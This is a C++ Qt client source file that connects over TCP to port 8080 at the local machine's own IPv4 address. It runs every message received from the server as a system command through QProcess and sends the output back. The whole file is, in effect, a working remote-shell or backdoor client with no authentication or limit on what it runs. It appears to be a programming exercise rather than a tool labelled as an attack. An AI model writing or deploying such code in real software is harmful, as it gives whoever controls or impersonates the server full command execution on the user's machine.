#include "my_client.h"
#include "ui_my_client.h"
#include <QtDebug>
#include <QByteArray>
#include <QHostAddress>
#include <QStyle>
#include <QtNetwork>
#include <QProcess>

My_Client::My_Client(QWidget *parent)
    : QMainWindow(parent)
    , ui(new Ui::My_Client)
{
    ui->setupUi(this);
    ConnectToServer();
   // QTimer *try_to_connect = new QTimer();
   // connect(try_to_connect, &QTimer::timeout, this, &My_Client::ConnectToServer);
   // try_to_connect->start(3000);
}

My_Client::~My_Client()
{
    delete ui;
}

void My_Client::ConnectToServer()
{
 // if(connection_state)
    //{
        //qDebug() << "try to connecting";
        client_Socket = new QTcpSocket();
        QString serverIP;

        QList<QHostAddress> ipAddressesList = QNetworkInterface::allAddresses();

        for (const QHostAddress &address : ipAddressesList) {
            if (address != QHostAddress::LocalHost && address != QHostAddress::LocalHostIPv6 &&
                address.protocol() == QAbstractSocket::IPv4Protocol)
            {
                serverIP = address.toString();
                break;
            }
        }
            client_Socket->connectToHost(serverIP, 8080);
            //if(client_Socket->state() == QTcpSocket::ConnectedState)
            //    connection_state = 0;

            connect(client_Socket, SIGNAL(disconnected()), this, SLOT(Disconnected_FromServer()));
            connect(client_Socket, SIGNAL(readyRead()), this, SLOT(Read_Data()));
            connect(client_Socket, SIGNAL(connected()), this, SLOT(Check_connection_To_Server()));
   // }
   // qDebug() << "connected.";
}

void My_Client::Write_Data(QString out)
{
    qDebug() << "Write data";

    if (!out.isEmpty())
    {
        QByteArray requestData = out.toUtf8();
            client_Socket->write(requestData);
    }
}

void My_Client::Read_Data()
{
    QByteArray data = client_Socket->readAll();
    qDebug() << "Read data : " + data;
    procces_the_command(data);
}

void My_Client::procces_the_command(QString command) {
    QProcess proc;
    proc.start(command);
    proc.waitForFinished();
    QString output = proc.readAllStandardOutput();
    qDebug() << output;
    Write_Data(output);
}


